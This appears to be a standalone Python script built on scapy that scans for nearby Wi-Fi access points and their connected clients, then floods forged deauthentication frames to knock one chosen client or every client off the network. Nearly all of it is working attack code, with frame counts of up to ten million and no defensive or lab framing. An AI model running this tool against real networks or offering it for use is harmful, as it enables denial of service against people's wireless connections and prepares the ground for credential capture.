import subprocess
import psutil
from scapy.all import *
import sys
import time
import os

def get_all_interfaces():
    interfaces = psutil.net_if_addrs()
    return interfaces

def set_monitor_mode(interface):
    try:
        subprocess.run(["systemctl", "stop", "NetworkManager"])
        subprocess.run(["ifconfig", interface, "down"], check=True)
        subprocess.run(["iwconfig", interface, "mode", "monitor"], check=True)
        subprocess.run(["ifconfig", interface, "up"], check=True)
        return True
    except subprocess.CalledProcessError as e:
        print(f"Failed to set {interface} to monitor mode: {e}")
        return False

def set_manage_mode(interface):
    try:
        subprocess.run(["ifconfig", interface, "down"], check=True)
        subprocess.run(["iwconfig", interface, "mode", "managed"], check=True)
        subprocess.run(["ifconfig", interface, "up"], check=True)
        subprocess.run(["systemctl", "start", "NetworkManager"])
        print(f"Interface {interface} set to monitor mode.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to set {interface} to monitor mode: {e}")

access_points = {}

def packet_handler(packet):
    if packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp):
        bssid = packet[Dot11].addr2
        ssid = packet[Dot11Elt].info.decode() if packet[Dot11Elt].info else "<hidden>"
        channel = int(ord(packet[Dot11Elt:3].info))
        if bssid not in access_points:
            access_points[bssid] = {"ssid": ssid, "channel": channel}
            print(f"AP detected: BSSID: {bssid}, SSID: {ssid}, Channel: {channel}")

def scan_wifi(interface):
    print(f"[*] Scanning for Wi-Fi APs on interface {interface}")
    sniff(iface=interface, prn=packet_handler, timeout=10)
    os.system("clear")
    print("\nDetected Access Points:")
    k = 0
    l = []
    for bssid, info in access_points.items():
        k += 1
        l.append(bssid)
        print(f"[{k}] BSSID: {bssid}, SSID: {info['ssid']}, Channel: {info['channel']}")
    x = int(input("Enter the selection: "))
    return l[x-1]

unique_clients = set()

def packet_handler1(packet):
    if packet.haslayer(Dot11):
        if packet.type == 2:
            bssid = packet.addr3
            client = packet.addr2
            if bssid == gateway_mac and client not in unique_clients:
                unique_clients.add(client)
                print(f"Client detected: Client MAC: {client}")

def scan_clients(interface, target_bssid):
    print(f"[*] Scanning for clients connected to AP with BSSID {target_bssid} on interface {interface}")
    sniff(iface=interface, prn=packet_handler1, timeout=160)
    os.system("clear")
    print("\nDetected Clients:")
    k = 0
    l = []
    print("[0] Deauth all")
    for client in unique_clients:
        k += 1
        l.append(client)
        print(f"[{k}] Client MAC: {client}")
    x = int(input("select the clint:"))
    if x == 0:
        return "all"
    return l[x-1]

def deauth(target_mac, gateway_mac, interface):
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    frame = RadioTap() / dot11 / Dot11Deauth(reason=7)
    print(f"Sending deauthentication packets to {target_mac} from {gateway_mac}")
    sendp(frame, iface=interface, count=10000000, inter=0.1, verbose=1)

def deauthall(interface, target_bssid, count):
    packet = RadioTap() / \
             Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / \
             Dot11Deauth(reason=7)
    print(f"Sending deauth packets to {target_bssid}...")
    sendp(packet, iface=interface, count=count, inter=0.1, verbose=1)
    print("Deauth packets sent.")

def main():
    interfaces = get_all_interfaces().keys()
    if not interfaces:
        print("No network interfaces found.")
    else:
        print("Network interfaces found:")
        for interface in interfaces:
            print(f"Attempting to set {interface} to monitor mode...")
            if set_monitor_mode(interface):
                os.system("clear")
                print(f"Interface {interface} set to monitor mode.")
                break

    global gateway_mac
    gateway_mac = scan_wifi(interface)
    print(gateway_mac)
    client_gatway = scan_clients(interface, gateway_mac)
    print(client_gatway)
    os.system("clear")

    if client_gatway == "all":
        deauthall(interface, gateway_mac, 1000000)
    else:
        deauth(client_gatway, gateway_mac, interface)

    set_manage_mode(interface)

if __name__ == "__main__":
    main()
